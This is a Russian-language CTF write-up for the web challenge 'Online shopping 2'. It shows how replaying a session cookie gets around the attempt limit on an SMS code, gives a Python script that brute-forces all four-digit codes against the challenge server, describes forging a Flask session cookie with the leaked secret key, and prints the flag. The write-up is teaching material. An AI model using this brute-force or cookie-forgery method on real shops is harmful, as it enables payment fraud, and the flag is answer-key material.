# Online shopping 2: Write-up

*Рекомендуется читать после разбора Online shopping 1.*

Снова заходим на сайт и видим два товара. Пытаемся купить Флаг CTF. Вводим
16-значный номер карты, видим код подтверждения.

В этот раз в адресной строке нет никаких параметров. Однако, все сообщения выводятся.
Более того, после 5 неверных попыток ввода SMS-кода нельзя ничего купить.

Как может идти проверка? Видим, что создаётся кука `session` с непонятным
содержанием, после удаления которой можно начать заново.

Замечаем, что кука меняется в двух случаях:
* после ввода номера карты
* после ввода пин-кода

Попробуем зафиксировать куку перед первой неверной попыткой и будем перебирать
пин-код, пока нам отдают ответ о том, что код неверен.

```python
import requests
COOKIE = "your_session_cookie_here"
URL = "https://web250.ctf.upml.tech/check_code/"
for code in range(10000):
    r = requests.post(URL, data={'code': '{:>04d}'.format(code)}, cookies={'session': COOKIE})
    if "Обработка" in r.text:
        print(code, " ---")
    else:
        print(code, " OK")
        print(r.text)
```

Через какое-то время в консоли появляется HTML-код страницы с информацией
об успешной покупке. По ссылке и получаем флаг.

## Что делать с подсказкой?

После публикации подсказки таск многократно облегчался. Находим место, описывающее
способ генерации секретного кода. Проделываем то же самое (последние 4 цифры
десятеричной записи md5 от номера товара и номера карты) и получаем SMS-код.

Более того, можно было поставить себе экземпляр Flask, воспользоваться секретным
ключом нашего сервера и сгенерировать себе сессионную куку с ключами
`success=True` и `good_id=2`.

Флаг: **uctf_cookies_are_not_safe**
